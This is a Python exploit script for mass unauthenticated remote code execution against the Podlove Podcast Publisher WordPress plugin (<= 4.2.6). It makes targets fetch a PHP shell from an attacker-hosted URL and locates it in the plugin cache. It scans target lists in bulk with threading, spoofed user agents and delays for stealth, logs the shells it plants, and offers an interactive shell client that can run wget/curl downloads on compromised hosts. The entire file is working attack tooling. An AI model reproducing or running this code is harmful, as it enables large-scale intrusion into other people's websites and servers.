#!/usr/bin/env python3
"""
Podlove Podcast Publisher <= 4.2.6 - Unauthenticated RCE Exploit
Enhanced Version with Bulk Scanning, Threading, and Stealth Features
Author: Ghostpels - hehehehehe
Version: 2.0
"""

import requests
import hashlib
import sys
import time
import argparse
import random
import threading
from urllib.parse import urlparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import os
from datetime import datetime

class PodloveMassExploiter:
    # Enhanced User-Agent pool for stealth
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'WordPress/6.4.2; https://example.com',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    ]

    def __init__(self, verbose=False):
        self.verbose = verbose
        self.session_pool = {}
        self.lock = threading.Lock()

    def get_session(self, thread_id):
        """Get or create a session for thread with random User-Agent"""
        with self.lock:
            if thread_id not in self.session_pool:
                session = requests.Session()
                session.headers.update({
                    'User-Agent': random.choice(self.USER_AGENTS),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                })
                session.verify = False  # Handle SSL issues
                self.session_pool[thread_id] = session
            return self.session_pool[thread_id]

    def normalize_target_url(self, url):
        """Normalize target URL with protocol detection"""
        if not url:
            return None

        # Remove whitespace
        url = url.strip()

        # If already has protocol, return as is
        if url.startswith(('http://', 'https://')):
            return url.rstrip('/')

        # Try HTTPS first, then HTTP
        protocols = ['https://', 'http://']

        for protocol in protocols:
            test_url = protocol + url
            try:
                session = requests.Session()
                session.verify = False
                session.timeout = 5
                # HEAD request first to check
                response = session.head(test_url, allow_redirects=True)
                if response.status_code < 500:  # Accept anything except server errors
                    return test_url.rstrip('/')
            except:
                continue

        # If nothing works, default to http
        return f'http://{url}'.rstrip('/')

    def hex_encode(self, url):
        """Hex encode URL for Podlove parameter"""
        return url.encode().hex()

    def test_r2_accessible(self, r2_url, thread_id=0):
        """Test if R2 file is accessible"""
        session = self.get_session(thread_id)

        if self.verbose:
            print(f"[*] Testing R2 URL: {r2_url}")

        try:
            response = session.get(r2_url, timeout=10)
            if response.status_code == 200:
                if self.verbose:
                    print(f"[+] R2 accessible ({len(response.content)} bytes)")
                return True
            else:
                if self.verbose:
                    print(f"[-] R2 HTTP {response.status_code}")
                return False
        except Exception as e:
            if self.verbose:
                print(f"[-] R2 Error: {e}")
            return False

    def exploit_single_target(self, target_url, r2_url, filename=None, thread_id=0, retry_count=0):
        """Exploit a single target and return result"""
        session = self.get_session(thread_id)

        # Random delay for stealth (1-3 seconds)
        time.sleep(random.uniform(1.0, 3.0))

        result = {
            'target': target_url,
            'vulnerable': False,
            'shell_url': None,
            'error': None,
            'hash': None
        }

        try:
            # Parse filename from R2 URL if not provided
            if filename is None:
                parsed = urlparse(r2_url)
                filename = parsed.path.split('/')[-1].split('.')[0] or "shell"

            # Step 1: Trigger upload
            encoded_url = self.hex_encode(r2_url)

            endpoints = [
                f"{target_url}/podlove/image/{encoded_url}/100/100/0/{filename}",
                f"{target_url}/index.php?podlove_image_cache_url={encoded_url}&podlove_width=100&podlove_height=100&podlove_crop=0&podlove_file_name={filename}"
            ]

            upload_success = False
            for endpoint in endpoints:
                try:
                    response = session.get(endpoint, timeout=30)
                    if response.status_code == 200:
                        upload_success = True
                        break
                except:
                    continue

            if not upload_success:
                result['error'] = "Upload trigger failed"
                return result

            # Wait for cache processing
            time.sleep(3)

            # Step 2: Calculate file location
            file_hash = hashlib.md5((r2_url + filename).encode()).hexdigest()
            result['hash'] = file_hash
            subdir = f"{file_hash[:2]}/{file_hash[2:]}"

            # Get extension
            path = urlparse(r2_url).path
            ext = path.split('.')[-1] if '.' in path else 'php'

            # Build possible URLs
            base_url = f"{target_url}/wp-content/cache/podlove/{subdir}"
            primary_url = f"{base_url}/{filename}_original.{ext}"

            # Step 3: Try to find the file
            urls_to_try = [
                primary_url,
                f"{base_url}/original.{ext}",
                f"{base_url}/{filename}.{ext}",
                f"{base_url}/original_{filename}.{ext}",
            ]

            # Add common PHP extensions
            for php_ext in ['php', 'php5', 'php7', 'phtml', 'phar', 'gif.php']:
                urls_to_try.extend([
                    f"{base_url}/{filename}_original.{php_ext}",
                    f"{base_url}/original.{php_ext}",
                ])

            shell_url = None
            for test_url in urls_to_try:
                try:
                    response = session.get(test_url, timeout=10)
                    if response.status_code == 200:
                        # Basic validation - not an error page
                        content_lower = response.text.lower()
                        error_indicators = [
                            '404 not found',
                            '403 forbidden',
                            'access denied',
                            'internal server error',
                        ]

                        if not any(error in content_lower for error in error_indicators):
                            shell_url = test_url
                            break
                except:
                    continue

            if shell_url:
                result['vulnerable'] = True
                result['shell_url'] = shell_url
            else:
                result['error'] = "Shell file not found"

        except Exception as e:
            result['error'] = str(e)

            # Retry logic
            if retry_count < 2:  # Max 3 attempts (0, 1, 2)
                time.sleep(2 * (retry_count + 1))  # Exponential backoff
                return self.exploit_single_target(target_url, r2_url, filename, thread_id, retry_count + 1)

        return result

    def process_targets_bulk(self, targets_file, r2_url, filename, output_file, threads=10):
        """Process multiple targets from file"""
        # Read targets
        try:
            with open(targets_file, 'r') as f:
                raw_targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[-] Error reading targets file: {e}")
            return

        # Normalize URLs
        targets = []
        for target in raw_targets:
            normalized = self.normalize_target_url(target)
            if normalized:
                targets.append(normalized)

        total = len(targets)
        print(f"[*] Loaded {total} targets from {targets_file}")

        # Test R2 first
        print("[*] Testing R2 file accessibility...")
        if not self.test_r2_accessible(r2_url):
            print("[-] R2 file not accessible. Aborting.")
            return

        # Prepare output
        output_dir = os.path.dirname(output_file) or '.'
        os.makedirs(output_dir, exist_ok=True)

        vuln_count = 0
        processed = 0

        print(f"\n[*] Starting bulk exploitation with {threads} threads")
        print(f"[*] Output: {output_file}")
        print("-" * 60)

        start_time = time.time()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            # Submit all tasks
            future_to_target = {}
            for target in targets:
                future = executor.submit(
                    self.exploit_single_target,
                    target, r2_url, filename,
                    hash(target) % threads  # Thread ID
                )
                future_to_target[future] = target

            # Process results as they complete
            for future in as_completed(future_to_target):
                target = future_to_target[future]
                processed += 1

                try:
                    result = future.result(timeout=60)

                    # Display progress
                    progress = f"[{processed}/{total}] {target}"

                    if result['vulnerable']:
                        vuln_count += 1
                        status = "VULNERABLE"

                        # Save to output file
                        with open(output_file, 'a') as f:
                            f.write(f"{target}|{result['shell_url']}\n")

                        # Print success
                        print(f"\n[+] {progress} - {status}")
                        print(f"    Shell: {result['shell_url']}")

                    else:
                        status = "NOT VULNERABLE"
                        if self.verbose and result.get('error'):
                            print(f"[-] {progress} - {status} ({result['error']})")
                        elif self.verbose:
                            print(f"[-] {progress} - {status}")

                    # Progress indicator
                    if processed % 10 == 0:
                        elapsed = time.time() - start_time
                        rate = processed / elapsed if elapsed > 0 else 0
                        print(f"\n[*] Progress: {processed}/{total} ({rate:.1f} targets/sec)")

                except Exception as e:
                    print(f"[-] Error processing {target}: {e}")
                    processed += 1

        # Summary
        elapsed = time.time() - start_time
        print("\n" + "=" * 60)
        print("[*] BULK EXPLOITATION COMPLETED")
        print("=" * 60)
        print(f"    Total targets: {total}")
        print(f"    Processed: {processed}")
        print(f"    Vulnerable: {vuln_count}")
        print(f"    Success rate: {(vuln_count/total*100):.1f}%")
        print(f"    Time elapsed: {elapsed:.1f} seconds")
        print(f"    Output file: {output_file}")

        if vuln_count > 0:
            print(f"\n[*] Vulnerable targets saved to: {output_file}")
            print("[*] Format: target_url|shell_url")
            print("\n[*] Example usage:")
            print(f"    # Test first shell: ")
            print(f"    SHELL=$(head -1 {output_file} | cut -d'|' -f2)")
            print(f'    curl "$SHELL?cmd=whoami"')

    def interactive_shell(self, shell_url):
        """Interactive shell mode"""
        print(f"""
{'='*60}
[*] PODLOVE INTERACTIVE SHELL MODE
{'='*60}
[*] Shell URL: {shell_url}
[*] Type 'exit' or 'quit' to exit
[*] Type 'help' for available commands
{'='*60}
        """)

        # Create session
        session = requests.Session()
        session.headers.update({
            'User-Agent': random.choice(self.USER_AGENTS),
            'Accept': '*/*',
        })
        session.verify = False

        # Test shell first
        print("[*] Testing shell connectivity...")
        separator = '&' if '?' in shell_url else '?'
        test_url = f"{shell_url}{separator}cmd=whoami"

        try:
            response = session.get(test_url, timeout=10)
            if response.status_code != 200:
                print(f"[-] Shell not responding (HTTP {response.status_code})")
                return
            print("[+] Shell is responsive")
        except Exception as e:
            print(f"[-] Error: {e}")
            return

        # Interactive loop
        while True:
            try:
                cmd = input("\nshell> ").strip()

                if not cmd:
                    continue

                if cmd.lower() in ['exit', 'quit']:
                    print("[*] Exiting...")
                    break

                if cmd.lower() == 'help':
                    print("""
Available commands:
  !info     - System information
  !phpinfo  - PHP information
  !download <url> <path> - Download file
  !upload   - Not implemented
  !cd <dir> - Change directory (via shell)
  exit/quit - Exit shell
                    """)
                    continue

                # Special commands
                if cmd == '!info':
                    cmds = ['uname -a', 'id', 'pwd', 'df -h', 'free -h']
                    for c in cmds:
                        self._execute_command(session, shell_url, c, separator)
                        time.sleep(0.5)
                    continue

                if cmd == '!phpinfo':
                    self._execute_command(session, shell_url, 'php -i', separator)
                    continue

                if cmd.startswith('!download '):
                    parts = cmd.split()
                    if len(parts) == 3:
                        url, path = parts[1], parts[2]
                        download_cmd = f"wget {url} -O {path} 2>/dev/null || curl {url} -o {path} 2>/dev/null"
                        self._execute_command(session, shell_url, download_cmd, separator)
                    continue

                if cmd.startswith('!cd '):
                    cmd = f"cd {cmd[4:]} && pwd"

                # Regular command
                self._execute_command(session, shell_url, cmd, separator)

            except KeyboardInterrupt:
                print("\n[*] Exiting...")
                break
            except Exception as e:
                print(f"[-] Error: {e}")

    def _execute_command(self, session, shell_url, command, separator):
        """Execute a single command"""
        exploit_url = f"{shell_url}{separator}cmd={quote(command)}"

        try:
            start_time = time.time()
            response = session.get(exploit_url, timeout=15)
            elapsed = time.time() - start_time

            if response.status_code == 200:
                print(f"\n[+] Command executed ({elapsed:.2f}s)")
                print("-" * 40)

                # Try to extract content between <pre> tags
                content = response.text
                if '<pre>' in content and '</pre>' in content:
                    match = re.search(r'<pre>(.*?)</pre>', content, re.DOTALL)
                    if match:
                        print(match.group(1).strip())
                    else:
                        print(content[:500])
                else:
                    print(content[:500])

                print("-" * 40)
            else:
                print(f"[-] HTTP {response.status_code}")

        except Exception as e:
            print(f"[-] Error: {e}")

def main():
    parser = argparse.ArgumentParser(
        description='Podlove Podcast Publisher <= 4.2.6 - Mass RCE Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f'''
Examples:
  %(prog)s -u http://target.com -s https://r2.dev/shell.php --filename shell
  %(prog)s -f targets.txt -s https://r2.dev/shell.php -o vuln.txt -t 15 --filename shell
  %(prog)s --shell-url http://target.com/shell.php

Output format (vuln.txt):
  target_url|shell_url
  http://target1.com|http://target1.com/wp-content/cache/podlove/xx/xxxx/shell.php
        '''
    )

    # Operation modes
    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument('-u', '--url', help='Single target URL')
    mode_group.add_argument('-f', '--file', help='File containing target URLs (one per line)')
    mode_group.add_argument('--shell-url', help='Direct shell URL for interactive mode')

    # Shell upload parameters
    parser.add_argument('-s', '--shell', help='R2 shell URL to upload')
    parser.add_argument('--filename', help='Custom filename for shell (default: from R2 URL)')

    # Bulk mode parameters
    parser.add_argument('-o', '--output', help='Output file for vulnerable targets (bulk mode only)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')

    # Options
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--no-r2-test', action='store_true', help='Skip R2 accessibility test')

    args = parser.parse_args()

    # Validate arguments
    if args.file and not args.output:
        parser.error("Bulk mode (-f) requires output file (-o)")

    if (args.url or args.file) and not args.shell:
        parser.error("Single/bulk mode requires R2 shell URL (-s)")

    if args.shell and not (args.url or args.file):
        parser.error("R2 shell URL (-s) requires target (-u or -f)")

    print(f"""
{'='*60}
[*] PODLOVE PODCAST PUBLISHER <= 4.2.6 - MASS RCE EXPLOIT
[*] Author : Ghostpels - hehehehehe
[*] Version 2.0 | Enhanced with Bulk Scanning & Stealth
{'='*60}
    """)

    exploiter = PodloveMassExploiter(verbose=args.verbose)

    # MODE 3: Interactive shell
    if args.shell_url:
        exploiter.interactive_shell(args.shell_url)
        return

    # MODE 1: Single target
    if args.url:
        target = exploiter.normalize_target_url(args.url)
        print(f"[*] Target: {target}")
        print(f"[*] R2 Shell: {args.shell}")

        # Test R2
        if not args.no_r2_test:
            if not exploiter.test_r2_accessible(args.shell):
                print("[-] R2 file not accessible")
                sys.exit(1)

        # Exploit
        print("\n[*] Exploiting single target...")
        result = exploiter.exploit_single_target(target, args.shell, args.filename, thread_id=0)

        print("\n" + "=" * 60)
        if result['vulnerable']:
            print("[+] TARGET IS VULNERABLE!")
            print(f"[+] Shell URL: {result['shell_url']}")
            print(f"[+] Hash: {result['hash']}")

            # Ask for interactive mode
            choice = input("\n[*] Start interactive shell? [Y/n]: ").strip().lower()
            if choice in ['y', 'yes', '']:
                exploiter.interactive_shell(result['shell_url'])
        else:
            print("[-] Target not vulnerable")
            if result.get('error'):
                print(f"[-] Error: {result['error']}")

        print("\n[+] Single target exploitation completed")

    # MODE 2: Bulk targets
    elif args.file:
        if not args.output:
            print("[-] Output file required for bulk mode")
            sys.exit(1)

        print(f"[*] Targets file: {args.file}")
        print(f"[*] R2 Shell: {args.shell}")
        print(f"[*] Output file: {args.output}")
        print(f"[*] Threads: {args.threads}")

        # Clear output file if exists
        if os.path.exists(args.output):
            os.remove(args.output)

        # Start bulk exploitation
        exploiter.process_targets_bulk(
            args.file,
            args.shell,
            args.filename,
            args.output,
            args.threads
        )

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
